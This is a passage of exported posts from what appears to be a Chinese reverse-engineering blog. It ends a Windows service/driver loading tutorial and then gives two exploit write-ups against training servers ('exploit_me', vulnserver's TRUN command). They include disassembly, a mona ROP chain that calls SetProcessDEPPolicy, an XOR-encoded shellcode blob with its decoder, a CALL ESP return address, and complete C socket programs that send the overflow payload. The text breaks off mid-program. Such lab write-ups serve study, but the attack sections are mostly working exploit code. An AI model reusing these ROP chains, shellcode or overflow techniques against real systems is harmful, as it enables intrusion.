LPTSTR* lpszArgv) &#123; OutputDebugString(&quot;[51asm] SvcInit&quot;); //创建事件对象 ghSvcStopEvent = CreateEvent( NULL, // default security attributes TRUE, // manual reset event FALSE, // not signaled NULL); // no name if (ghSvcStopEvent == NULL) &#123; ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0); return; &#125; //将状态设置为运行状态 ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0); while (1) &#123; WaitForSingleObject(ghSvcStopEvent, INFINITE); //将服务状态设置为停止状态 ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0); OutputDebugString(&quot;[51asm] SvcInit return&quot;); return; &#125;&#125;int main(int argc, char* argv[]) &#123; //将控制台程序转换为服务程序 SERVICE_TABLE_ENTRY DispatchTable[] = &#123; &#123; (LPSTR)SVCNAME, (LPSERVICE_MAIN_FUNCTION)SvcMain &#125;, &#123; NULL, NULL &#125; &#125;; StartServiceCtrlDispatcher(DispatchTable); return 0;&#125; 服务的加载 如果一个程序是 ServiceMain ，他就是一个服务程序。需要使用 CreateService 安装、 StartServce 开始、 ControlService 控制服务停止、 DeleteService 就是卸载服务。 CreateService 来安装服务，其就是在注册表创建一个注册表选项。在调用安装等操作之前，需要创建服务管理器，让有权限的对象来进行这些操作，来提高安全性。 需要注意的是：得到的服务管理器对象的句柄和通过CreateService 等得到的服务对象的句柄需要关闭。 代码示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125//显示错误信息void ShowLastError() &#123; LPVOID lpMsgBuf; FormatMessage( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language (LPTSTR)&amp; lpMsgBuf, 0, NULL ); printf(&quot;%s\\n&quot;, lpMsgBuf); LocalFree(lpMsgBuf);&#125;//安装服务void Install() &#123; SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (hSCM == NULL) &#123; ShowLastError(); return; &#125; SC_HANDLE hService = CreateService(hSCM, SVCNAME, SVCNAME, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, SRVPATH, NULL, NULL, NULL, NULL, NULL); if (hService == NULL) &#123; ShowLastError(); &#125; else &#123; printf(&quot;Install OK\\n&quot;); CloseServiceHandle(hService); &#125; CloseServiceHandle(hSCM);&#125;void Unload() &#123; SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (hSCM == NULL) &#123; ShowLastError(); return; &#125; SC_HANDLE hService = OpenService(hSCM, SVCNAME, SERVICE_ALL_ACCESS); if (hService == NULL) &#123; ShowLastError(); &#125; else &#123; if (!DeleteService(hService)) &#123; ShowLastError(); &#125; else &#123; printf(&quot;Unload OK\\n&quot;); &#125; CloseServiceHandle(hService); &#125; CloseServiceHandle(hSCM);&#125;//启动服务void StartSrv() &#123; SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (hSCM == NULL) &#123; ShowLastError(); return; &#125; SC_HANDLE hService = OpenService(hSCM, SVCNAME, SERVICE_ALL_ACCESS); if (hService == NULL) &#123; ShowLastError(); &#125; else &#123; if (!StartService(hService, NULL, NULL)) &#123; ShowLastError(); &#125; else &#123; printf(&quot;StartSrv OK\\n&quot;); &#125; CloseServiceHandle(hService); &#125; CloseServiceHandle(hSCM);&#125;//停止服务void StopSrv() &#123; SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (hSCM == NULL) &#123; ShowLastError(); return; &#125; SC_HANDLE hService = OpenService(hSCM, SVCNAME, SERVICE_ALL_ACCESS); if (hService == NULL) &#123; ShowLastError(); &#125; else &#123; SERVICE_STATUS status; if (!ControlService(hService, SERVICE_CONTROL_STOP, &amp;status)) &#123; ShowLastError(); &#125; else &#123; printf(&quot;StopSrv OK\\n&quot;); &#125; // 关闭对象句柄 CloseServiceHandle(hService); &#125; CloseServiceHandle(hSCM);&#125; 服务的使用 可以自定义控制码，也可以使用系统提供的一些控制码，调用ControlService 来与Ring3 环的服务进行通信","categories":[{"name":"内核驱动编程","slug":"内核驱动编程","permalink":"https://4st.tech/categories/%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"内核","slug":"内核","permalink":"https://4st.tech/tags/%E5%86%85%E6%A0%B8/"},{"name":"驱动","slug":"驱动","permalink":"https://4st.tech/tags/%E9%A9%B1%E5%8A%A8/"}]},{"title":"利用ROP突破DEP：分析expolit_me并做rop","slug":"利用ROP突破DEP：分析expolit_me并做rop","date":"2021-04-07T08:03:36.000Z","updated":"2021-08-04T04:57:02.776Z","comments":true,"path":"2021/04/07/li-yong-rop-tu-po-dep-fen-xi-expolit-me-bing-zuo-rop/","link":"","permalink":"https://4st.tech/2021/04/07/li-yong-rop-tu-po-dep-fen-xi-expolit-me-bing-zuo-rop/","excerpt":"","text":"利用ROP突破DEP：分析expolit_me并做rop 分析目标程序 使用OD打开exploit_me，找到关键的几个函数的参数： 创建socket的几个参数： 1230022FCB0 00000002 |Family = AF_INET0022FCB4 00000001 |Type = SOCK_STREAM0022FCB8 00000006 \\Protocol = IPPROTO_TCP bind的参数中最重要的是ip 地址和端口号 了，可以分析sockaddr 或者使用命令netstat -ano 可以获取到，其bind的是0.0.0.0 : 9999 然后继续向下查看，在接受连接后，创建一个线程来进行处理： 1234567800401765 |. C74424 14 000&gt;|mov dword ptr ss:[esp+0x14],0x0 ; |0040176D |. C74424 10 000&gt;|mov dword ptr ss:[esp+0x10],0x0 ; |00401775 |. 8B85 F0FDFFFF |mov eax,[local.132] ; |0040177B |. 894424 0C |mov dword ptr ss:[esp+0xC],eax ; |0040177F |. C74424 08 481&gt;|mov dword ptr ss:[esp+0x8],vulnserv.00401848 ; |00401787 |. C74424 04 000&gt;|mov dword ptr ss:[esp+0x4],0x0 ; |0040178F |. C70424 000000&gt;|mov dword ptr ss:[esp],0x0 ; |00401796 |. E8 9D160000 |call &lt;jmp.&amp;KERNEL32.CreateThread&gt; ; 在线程回调函数的起始位置下int3断点，跟踪分析，找到了调用strcpy的子函数，其对应的命令是： 12345678900401CDB |&gt; \\C74424 08 050&gt;|mov dword ptr ss:[esp+0x8],0x5 ; |||00401CE3 |. C74424 04 F34&gt;|mov dword ptr ss:[esp+0x4],vulnserv.004&gt;; |||ASCII &quot;TRUN &quot;00401CEB |. 8B45 F0 |mov eax,[local.4] ; |||00401CEE |. 890424 |mov dword ptr ss:[esp],eax ; |||00401CF1 |. E8 C2100000 |call &lt;jmp.&amp;msvcrt.strncmp&gt; ; ||\\strncmp00401CF6 |. 85C0 |test eax,eax ; ||00401CF8 |. 0F85 DC000000 |jnz vulnserv.00401DDA ; ||00401CFE |. C70424 B80B00&gt;|mov dword ptr ss:[esp],0xBB8 ; ||00401D05 |. E8 B6100000 |call &lt;jmp.&amp;msvcrt.malloc&gt; ; |\\malloc 当比较通过时，则会向下继续执行，并申请了0xBB8的堆大小，即：3000 个字节。然后将发送过来的数据拷贝到该堆中，然后调用CallStrcpy函数： 12345600401D51 |. C74424 08 B80&gt;||mov dword ptr ss:[esp+0x8],0xBB8 ; | 拷贝长度00401D59 |. 8B45 F0 ||mov eax,[local.4] ; |00401D5C |. 894424 04 ||mov dword ptr ss:[esp+0x4],eax ; |00401D60 |. 8B85 A4FAFFFF ||mov eax,[local.343] ; |00401D66 |. 890424 ||mov dword ptr ss:[esp],eax ; |00401D69 |. E8 72100000 ||call &lt;jmp.&amp;msvcrt.strncpy&gt; ; \\strncpy 然后在其后面调用了strcpy： 1234567891000401808 /$ 55 push ebp00401809 |. 89E5 mov ebp,esp0040180B |. 81EC E8070000 sub esp,0x7E800401811 |. 8B45 08 mov eax,[arg.1] ; |00401814 |. 894424 04 mov dword ptr ss:[esp+0x4],eax ; |00401818 |. 8D85 28F8FFFF lea eax,[local.502] ; |0040181E |. 890424 mov dword ptr ss:[esp],eax ; |00401821 |. E8 A2150000 call &lt;jmp.&amp;msvcrt.strcpy&gt; ; \\strcpy00401826 |. C9 leave00401827 \\. C3 retn 经过分析可以得到其在栈空间中分配的临时的字符缓冲区大小为0x7E8 ，即：2024 个字节大小 构造利用 mona找rop链 使用mona脚本，来构造ROP链 123456789101112131415161718192021222324252627282930*** [ C ] *** #define CREATE_ROP_CHAIN(name, ...) \\ int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \\ unsigned int name[name##_length / sizeof(unsigned int)]; \\ create_rop_chain(name, ##__VA_ARGS__); int create_rop_chain(unsigned int *buf, unsigned int ) &#123; // rop chain generated with mona.py - www.corelan.be unsigned int rop_gadgets[] = &#123; 0x77bf9d61, // POP EBP // RETN [msvcrt.dll] 0x7c862144, // SetProcessDEPPolicy() [kernel32.dll] 0x77eaf4de, // POP EBX // RETN [RPCRT4.dll] 0x62505000, // &amp;0x00000000 [essfunc.dll] 0x77c0dbbc, // POP EDI // RETN [msvcrt.dll] 0x77c0dbbc, // skip 4 bytes [msvcrt.dll] 0x7c96d22b, // PUSHAD // RETN [ntdll.dll] &#125;; if(buf != NULL) &#123; memcpy(buf, rop_gadgets, sizeof(rop_gadgets)); &#125;; return sizeof(rop_gadgets); &#125; // use the &#x27;rop_chain&#x27; variable after this call, it&#x27;s just an unsigned int[] CREATE_ROP_CHAIN(rop_chain, ); // alternatively just allocate a large enough buffer and get the rop chain, i.e.: // unsigned int rop_chain[256]; // int rop_chain_length = create_rop_chain(rop_chain, ); 需要注意0截断的问题。 exploit程序 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#include &lt;Winsock2.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#pragma comment(lib, &quot;Ws2_32.lib&quot;)bool SocketStartup()&#123; WORD wVersionRequested; WSADATA wsaData; int err; wVersionRequested = MAKEWORD( 2, 2 ); err = WSAStartup( wVersionRequested, &amp;wsaData ); if ( err != 0 ) &#123; /* Tell the user that we could not find a usable */ /* WinSock DLL. */ return false; &#125; /* Confirm that the WinSock DLL supports 2.2.*/ /* Note that if the DLL supports versions greater */ /* than 2.2 in addition to 2.2, it will still return */ /* 2.2 in wVersion since that is the version we */ /* requested. */ if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 2 ) &#123; /* Tell the user that we could not find a usable */ /* WinSock DLL. */ WSACleanup( ); return false; &#125; return true;&#125;#define BUF_MAX_SIZE (0x7E8 + 28 + 17 + 176 + 4 + 6)int main()&#123; unsigned int rop_gadgets[] = &#123; 0x77bf9d61, // POP EBP // RETN [msvcrt.dll] 0x7c862144, // SetProcessDEPPolicy() [kernel32.dll] 0x77eaf4de, // POP EBX // RETN [RPCRT4.dll] 0x62505001, // &amp;0x00000000 [essfunc.dll] 0x77c0dbbc, // POP EDI // RETN [msvcrt.dll] 0x77c0dbbc, // skip 4 bytes [msvcrt.dll] 0x7c96d22b, // PUSHAD // RETN [ntdll.dll] &#125;; size_t nRopBytes = sizeof(rop_gadgets); char szBuf[BUF_MAX_SIZE] = &#123;0&#125;; memset(szBuf, 0x90, BUF_MAX_SIZE); unsigned char decode_data[17] = &#123; 0x33, 0xC9, 0xB1, 0xC8, 0x8B, 0xFC, 0x83, 0xC7, 0x1D, 0x80, 0x37, 0x8C, 0x47, 0xFE, 0xC9, 0x75, 0xF8 &#125;; unsigned char encode_data[176] = &#123; 0x70, 0xE4, 0xE6, 0x86, 0xB4, 0x92, 0xE4, 0xEF, 0x05, 0x5D, 0xC3, 0xE4, 0xBE, 0xF8, 0x1D, 0x80, 0x07, 0x78, 0x01, 0xF2, 0x78, 0xBF, 0x57, 0x3B, 0x88, 0xA7, 0x6F, 0xEA, 0x37, 0xBF, 0xBE, 0xDF, 0xE4, 0xF9, 0xFF, 0xE9, 0xFE, 0xD8, 0xBF, 0x5E, 0xE8, 0x07, 0x91, 0x94, 0x8C, 0x8C, 0x8C, 0x07, 0xD7, 0xBC, 0x07, 0xD7, 0x80, 0x07, 0xD7, 0x80, 0x07, 0x97, 0x07, 0x97, 0x07, 0xE7, 0x94, 0x21, 0xB1, 0xE6, 0x86, 0xB4, 0x92, 0xF9, 0x89, 0x19, 0x73, 0xDB, 0x74, 0x19, 0xEC, 0x07, 0xC9, 0xB0, 0x07, 0xC0, 0x89, 0xF4, 0x8F, 0x41, 0x07, 0xD5, 0xAC, 0x8F, 0x51, 0xBF, 0x73, 0xCB, 0x07, 0xB8, 0x37, 0x8F, 0x79, 0x15, 0x83, 0x32, 0x8A, 0xB6, 0x48, 0xF8, 0x84, 0x4D, 0x46, 0x8B, 0x8F, 0x5C, 0xCA, 0x67, 0x7D, 0xB7, 0xD8, 0xA8, 0x90, 0xF9, 0x68, 0x07, 0xD5, 0xA8, 0x8F, 0x51, 0xEA, 0x07, 0xB0, 0xF7, 0x07, 0xD5, 0x90, 0x8F, 0x51, 0x8F, 0xA0, 0x37, 0x19, 0xD3, 0x27, 0xDB, 0xED, 0xB1, 0xE6, 0x86, 0xB4, 0x92, 0xF9, 0x25, 0xBF, 0x57, 0xDF, 0xE4, 0xE9, 0xE0, 0xE0, 0xE3, 0xE4, 0xFF, 0xED, 0xF5, 0xE4, 0x07, 0x48, 0xDF, 0xDC, 0xDC, 0xDF, 0x73, 0xDB, 0x70, 0xDF, 0x73, 0xDB, 0x74 &#125;; memcpy(szBuf, &quot;TRUN &quot;, strlen(&quot;TRUN &quot;) + 1); szBuf[5] = 0x2E; memcpy(&amp;szBuf[0x7E8 - 12], rop_gadgets, nRopBytes); memcpy(&amp;szBuf[0x7E8 - 12 + nRopBytes], decode_data, 17); memcpy(&amp;szBuf[0x7E8 - 12 + nRopBytes+ 17], encode_data, 176); if (SocketStartup() == false) &#123; return -1; &#125; SOCKET fdSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (fdSock == INVALID_SOCKET) &#123; std::cout &lt;&lt; &quot;create socket descriptor failed&quot; &lt;&lt; std::endl; return -1; &#125; sockaddr_in stSockAddr = &#123;0&#125;; stSockAddr.sin_family = AF_INET; stSockAddr.sin_port = htons(9999); stSockAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); if (connect(fdSock, (sockaddr*)&amp;stSockAddr, sizeof(stSockAddr)) == SOCKET_ERROR) &#123; std::cout &lt;&lt; &quot;connect failed&quot; &lt;&lt; std::endl; closesocket(fdSock); WSACleanup(); return -1; &#125; char szBuf1[100] = &#123;0&#125;; recv(fdSock, szBuf1, 100, 0); if (send(fdSock, szBuf, BUF_MAX_SIZE, 0) == SOCKET_ERROR) &#123; std::cout &lt;&lt; &quot;send failed&quot; &lt;&lt; std::endl; shutdown(fdSock, SD_SEND); closesocket(fdSock); WSACleanup(); return -1; &#125; std::cout &lt;&lt; &quot;utilize success&quot; &lt;&lt; std::endl; shutdown(fdSock, SD_SEND); closesocket(fdSock); WSACleanup(); return 0;&#125; 运行结果图","categories":[{"name":"shellcode在漏洞利用中的应用","slug":"shellcode在漏洞利用中的应用","permalink":"https://4st.tech/categories/shellcode%E5%9C%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://4st.tech/tags/%E9%80%86%E5%90%91/"},{"name":"shellcode","slug":"shellcode","permalink":"https://4st.tech/tags/shellcode/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://4st.tech/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"name":"rop","slug":"rop","permalink":"https://4st.tech/tags/rop/"}]},{"title":"栈溢出：分析exploit_me_A","slug":"栈溢出：分析exploit-me-A","date":"2021-04-06T07:33:47.000Z","updated":"2021-08-16T04:01:44.470Z","comments":true,"path":"2021/04/06/zhan-yi-chu-fen-xi-exploit-me-a/","link":"","permalink":"https://4st.tech/2021/04/06/zhan-yi-chu-fen-xi-exploit-me-a/","excerpt":"","text":"分析目标程序 分析大体流程 使用IDA打开，分析下这个程序的具体功能： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647.text:004010B0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:004010B0 _main proc near ; CODE XREF: start+AF\u0019p.text:004010B0.text:004010B0 addrlen = dword ptr -3B8h.text:004010B0 name = sockaddr ptr -3B4h.text:004010B0 addr = sockaddr ptr -3A4h.text:004010B0 buf = byte ptr -394h.text:004010B0 WSAData = WSAData ptr -190h.text:004010B0 argc = dword ptr 4.text:004010B0 argv = dword ptr 8.text:004010B0 envp = dword ptr 0Ch.text:004010B0.text:004010B0 sub esp, 3B4h.text:004010B6 lea eax, [esp+3B4h+WSAData].text:004010BD push ebp.text:004010BE push eax ; lpWSAData.text:004010BF push 101h ; wVersionRequested.text:004010C4 call ds:WSAStartup.text:004010C4.text:004010CA push 0 ; protocol.text:004010CC push 1 ; type.text:004010CE push 2 ; af.text:004010D0 call ds:socket.text:004010D0.text:004010D6 mov ebp, eax.text:004010D8 test ebp, ebp.text:004010DA jge short LBL_CREATE_SOCKET_SUCCESS.text:004010DA.text:004010DC push offset s-&gt;SocketCreatingError ; &quot;socket creating error!&quot;.text:004010E1 push ebp.text:004010E2 mov ecx, offset g_cout.text:004010E7 call ostream::operator&lt;&lt;(int).text:004010E7.text:004010EC mov ecx, eax.text:004010EE call ostream::operator&lt;&lt;(char const *).text:004010EE.text:004010F3 push offset flush.text:004010F8 push 0Ah.text:004010FA mov ecx, eax.text:004010FC call ostream::operator&lt;&lt;(uchar).text:004010FC.text:00401101 mov ecx, eax.text:00401103 call sub_4012B0.text:00401103.text:00401108 push 1 ; Code.text:0040110A call _exit.text:0040110A 其创建了一个AF_INET, SOCK_STREAM, IPPROTO_IP 类型的socket，如果创建失败则退出进程。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106.text:0040110F LBL_CREATE_SOCKET_SUCCESS: ; CODE XREF: _main+2A\u0018j.text:0040110F push 1E61h ; hostshort.text:00401114 mov word ptr [esp+3BCh+name.sa_data+2], 2.text:0040111B call ds:htons.text:0040111B.text:00401121 push 0 ; hostlong.text:00401123 mov word ptr [esp+3BCh+name.sa_data+4], ax.text:00401128 call ds:htonl.text:00401128.text:0040112E lea ecx, [esp+3B8h+name.sa_data+2].text:00401132 push 10h ; namelen.text:00401134 push ecx ; name.text:00401135 push ebp ; s.text:00401136 mov dword ptr [esp+3C4h+name.sa_data+6], eax.text:0040113A call ds:bind.text:0040113A.text:00401140 test eax, eax.text:00401142 jz short LBL_BINDING_STREAM_SOCKET_SUCCESS.text:00401142.text:00401144 push offset s-&gt;BindingStreamSocketError ; &quot;binding stream socket error!&quot;.text:00401149 mov ecx, offset g_cout.text:0040114E call ostream::operator&lt;&lt;(char const *).text:0040114E.text:00401153 push offset flush.text:00401158 push 0Ah.text:0040115A mov ecx, eax.text:0040115C call ostream::operator&lt;&lt;(uchar).text:0040115C.text:00401161 mov ecx, eax.text:00401163 call sub_4012B0.text:00401163.text:00401168.text:00401168 LBL_BINDING_STREAM_SOCKET_SUCCESS: ; CODE XREF: _main+92\u0018j.text:00401168 push ebx.text:00401169 push offset asc_4090B8 ; &quot;**************************************&quot;.text:0040116E mov ecx, offset g_cout.text:00401173 call ostream::operator&lt;&lt;(char const *).text:00401173.text:00401178 push offset flush.text:0040117D push 0Ah.text:0040117F mov ecx, eax.text:00401181 call ostream::operator&lt;&lt;(uchar).text:00401181.text:00401186 mov ecx, eax.text:00401188 call sub_4012B0.text:00401188.text:0040118D push offset s-&gt;ExploitTargetServer1_0 ; &quot; exploit target server 1.0\\t &quot;.text:00401192 mov ecx, offset g_cout.text:00401197 call ostream::operator&lt;&lt;(char const *).text:00401197.text:0040119C push offset flush.text:004011A1 push 0Ah.text:004011A3 mov ecx, eax.text:004011A5 call ostream::operator&lt;&lt;(uchar).text:004011A5.text:004011AA mov ecx, eax.text:004011AC call sub_4012B0.text:004011AC.text:004011B1 push offset asc_4090B8 ; &quot;**************************************&quot;.text:004011B6 mov ecx, offset g_cout.text:004011BB call ostream::operator&lt;&lt;(char const *).text:004011BB.text:004011C0 push offset flush.text:004011C5 push 0Ah.text:004011C7 mov ecx, eax.text:004011C9 call ostream::operator&lt;&lt;(uchar).text:004011C9.text:004011CE mov ecx, eax.text:004011D0 call sub_4012B0.text:004011D0.text:004011D5 push 4 ; backlog.text:004011D7 push ebp ; s.text:004011D8 call ds:listen.text:004011DE lea edx, [esp+3BCh+name].text:004011E2 lea eax, [esp+3BCh+addr.sa_data+2].text:004011E6 push edx ; addrlen.text:004011E7 push eax ; addr.text:004011E8 push ebp ; s.text:004011E9 mov dword ptr [esp+3C8h+name.sa_family], 10h.text:004011F1 call ds:accept.text:004011F1.text:004011F7 mov ebx, eax.text:004011F9 cmp ebx, 0FFFFFFFFh.text:004011FC jz short LBL_ACCEPT_ERR; ... 省略一部分代码.text:0040127D LBL_ACCEPT_ERR: ; CODE XREF: _main+14C\u0018j.text:0040127D push offset s-&gt;AcceptError ; &quot;accept error!&quot;.text:00401282 mov ecx, offset g_cout.text:00401287 call ostream::operator&lt;&lt;(char const *).text:00401287.text:0040128C push offset flush.text:00401291 push 0Ah.text:00401293 mov ecx, eax.text:00401295 call ostream::operator&lt;&lt;(uchar).text:00401295.text:0040129A mov ecx, eax.text:0040129C call sub_4012B0.text:0040129C.text:004012A1 call ds:WSACleanup.text:004012A1.text:004012A7 pop ebx.text:004012A8 pop ebp.text:004012A9 add esp, 3B4h.text:004012AF retn.text:004012AF.text:004012AF _main endp 绑定，并设置好端口号，开始监听，并等待连接。当有连接进来时，如果握手失败，则开始清理socket环境并退出程序；否则，开始接受数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162.text:004011FE push esi.text:004011FF push edi.text:004011FF.text:00401200.text:00401200 LBL_START_RECV: ; CODE XREF: _main+1AA\u0019j.text:00401200 ; _main+1C9\u0019j.text:00401200 mov ecx, 80h.text:00401205 xor eax, eax.text:00401207 lea edi, [esp+34h].text:0040120B push eax ; flags.text:0040120C rep stosd.text:0040120E lea ecx, [esp+38h].text:00401212 push 200h ; len.text:00401217 push ecx ; buf.text:00401218 push ebx ; s.text:00401219 call ds:recv.text:00401219.text:0040121F mov esi, eax.text:00401221 test esi, esi.text:00401223 jge short LBL_RECV_SUCCESS ; RecvBuf, len = 0x200.text:00401223.text:00401225 push offset s-&gt;ReadingStreamMessageErro ; &quot;reading stream message erro!&quot;.text:0040122A mov ecx, offset g_cout.text:0040122F call ostream::operator&lt;&lt;(char const *).text:0040122F.text:00401234 push offset flush.text:00401239 push 0Ah.text:0040123B mov ecx, eax.text:0040123D call ostream::operator&lt;&lt;(uchar).text:0040123D.text:00401242 mov ecx, eax.text:00401244 call sub_4012B0.text:00401244.text:00401249 xor esi, esi.text:00401249.text:0040124B.text:0040124B LBL_RECV_SUCCESS: ; CODE XREF: _main+173\u0018j.text:0040124B lea edx, [esp+34h] ; RecvBuf, len = 0x200.text:0040124F push edx.text:00401250 call ProcessRecv.text:00401250.text:00401255 add esp, 4.text:00401258 test esi, esi.text:0040125A jnz short LBL_START_RECV.text:0040125A.text:0040125C push ebx ; s.text:0040125D call ds:closesocket.text:0040125D.text:00401263 lea eax, [esp+3C4h+name].text:00401267 lea ecx, [esp+3C4h+addr.sa_data+2].text:0040126B push eax ; addrlen.text:0040126C push ecx ; addr.text:0040126D push ebp ; s.text:0040126E call ds:accept.text:0040126E.text:00401274 mov ebx, eax.text:00401276 cmp ebx, 0FFFFFFFFh.text:00401279 jnz short LBL_START_RECV.text:00401279.text:0040127B pop edi.text:0040127C pop esi 要想利用栈溢出，则需要找到其使用拷贝函数，且在拷贝时未检测其是否越界。 分析是否存在缓冲区溢出漏洞 仔细分析其收到数据后，对缓冲区的处理： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566.text:00401000 ProcessRecv proc near ; CODE XREF: _main+1A0\u0019p.text:00401000.text:00401000 aryTmpBuf = byte ptr -0C8h.text:00401000 pszRecvBuf = dword ptr 4.text:00401000.text:00401000 sub esp, 0C8h.text:00401006 or ecx, 0FFFFFFFFh.text:00401009 xor eax, eax.text:0040100B lea edx, [esp+0C8h+aryTmpBuf].text:0040100F push esi.text:00401010 push edi.text:00401011 mov edi, [esp+0D0h+pszRecvBuf].text:00401018 push offset asc_40904C ; &quot;********************&quot;.text:0040101D repne scasb.text:0040101F not ecx ; strlen(pszRecvBuf) + 1.text:00401021 sub edi, ecx ; 指针回到pszRecvBuf.text:00401023 mov eax, ecx.text:00401025 mov esi, edi.text:00401027 mov edi, edx.text:00401029 shr ecx, 2 .text:0040102C rep movsd.text:0040102E mov ecx, eax.text:00401030 and ecx, 3.text:00401033 rep movsb ; strcpy.text:00401035 mov ecx, offset g_cout.text:0040103A call ostream::operator&lt;&lt;(char const *).text:0040103A.text:0040103F push offset flush.text:00401044 push 0Ah ; 回车换行.text:00401046 mov ecx, eax.text:00401048 call ostream::operator&lt;&lt;(uchar).text:00401048.text:0040104D mov ecx, eax.text:0040104F call sub_4012B0.text:0040104F.text:00401054 push offset s-&gt;Received ; &quot;received:&quot;.text:00401059 mov ecx, offset g_cout.text:0040105E call ostream::operator&lt;&lt;(char const *).text:0040105E.text:00401063 push offset flush.text:00401068 push 0Ah.text:0040106A mov ecx, eax.text:0040106C call ostream::operator&lt;&lt;(uchar).text:0040106C.text:00401071 mov ecx, eax.text:00401073 call sub_4012B0.text:00401073.text:00401078 lea ecx, [esp+0D0h+aryTmpBuf].text:0040107C push ecx.text:0040107D mov ecx, offset g_cout.text:00401082 call ostream::operator&lt;&lt;(char const *).text:00401082.text:00401087 push offset flush.text:0040108C push 0Ah.text:0040108E mov ecx, eax.text:00401090 call ostream::operator&lt;&lt;(uchar).text:00401090.text:00401095 mov ecx, eax.text:00401097 call sub_4012B0.text:00401097.text:0040109C pop edi.text:0040109D pop esi.text:0040109E add esp, 0C8h.text:004010A4 retn.text:004010A4.text:004010A4 ProcessRecv endp 发现，其先使用strlen 函数，获得发送过来的数据的长度，然后直接对栈中临时的数据缓冲区拷贝数据。栈中的临时缓冲区长度为0xC8， 即200个字节。由于临时缓冲区的大小小于接受数据的缓冲区大小，且它在使用strcpy的时候，未进行数据长度的检查。 由此可以判断，该程序存在栈溢出漏洞问题。 栈溢出漏洞的利用 使用findaddr，找到call/jmp esp 指令。 171A2F8FB Found CALL ESP at 0x71a2f8fb Module: C:\\WINDOWS\\system32\\ws2_32.dll 所以在0xC8 后面应该存放的是这个地址：0x71a2f8fb 然后构造shellcode 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172cldpush 0x1E380A6Apush 0x4FD18963push 0xC917432mov esi,esplea edi,dword ptr ds:[esi-0xC]xor ebx,ebxmov bh,0x4sub esp,ebxmov bx,0x3233push ebxpush 0x72657375push espxor edx,edxmov ebx,dword ptr fs:[0x18]mov ebx,dword ptr ds:[ebx+0x30]mov ebx,dword ptr ds:[ebx+0xC]mov ebx,dword ptr ds:[ebx+0xC]mov ebx,dword ptr ds:[ebx]mov ebx,dword ptr ds:[ebx]mov ebp,dword ptr ds:[ebx+0x18]lods dword ptr ds:[esi]cmp eax,0x1E380A6Ajnz short 0012FC19xchg eax,ebpcall dword ptr ds:[edi-0x8]xchg eax,ebppushadmov eax,dword ptr ss:[ebp+0x3C]mov ecx,dword ptr ss:[ebp+eax+0x78]add ecx,ebpmov ebx,dword ptr ds:[ecx+0x20]add ebx,ebpxor edi,ediinc edimov esi,dword ptr ds:[ebx+edi*4]add esi,ebpcdqmovsx eax,byte ptr ds:[esi]cmp al,ahje short 0012FC40ror edx,0x7add edx,eax ; exploit_.00409A68inc esijmp short 0012FC31cmp edx,dword ptr ss:[esp+0x1C]jnz short 0012FC2Amov ebx,dword ptr ds:[ecx+0x24]add ebx,ebpmov di,word ptr ds:[ebx+edi*2]mov ebx,dword ptr ds:[ecx+0x1C]add ebx,ebpadd ebp,dword ptr ds:[ebx+edi*4]xchg eax,ebppop edi ; ws2_32.71A2F8FDstos dword ptr es:[edi]push edipopadcmp eax,0x1E380A6Ajnz short 0012FC0Cxor ebx,ebxpush ebxpush 0x6F6C6C65push 0x68796173mov eax,esppush ebxpush eax ; exploit_.00409A68push eax ; exploit_.00409A68push ebxcall dword ptr ds:[edi-0x4]push ebxcall dword ptr ds:[edi-0x8] 为了避免截断，使用亦或加密为不会产生阶段机器码的二进制。 实现exploit程序 使用的是VC6.0的环境，在xp下测试通过 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;Winsock2.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#pragma comment(lib, &quot;Ws2_32.lib&quot;)bool SocketStartup()&#123; WORD wVersionRequested; WSADATA wsaData; int err; wVersionRequested = MAKEWORD( 2, 2 ); err = WSAStartup( wVersionRequested, &amp;wsaData ); if ( err != 0 ) &#123; /* Tell the user that we could not find a usable */ /* WinSock DLL. */ return false; &#125; /* Confirm that the WinSock DLL supports 2.2.*/ /* Note that if the DLL supports versions greater */ /* than 2.2 in addition to 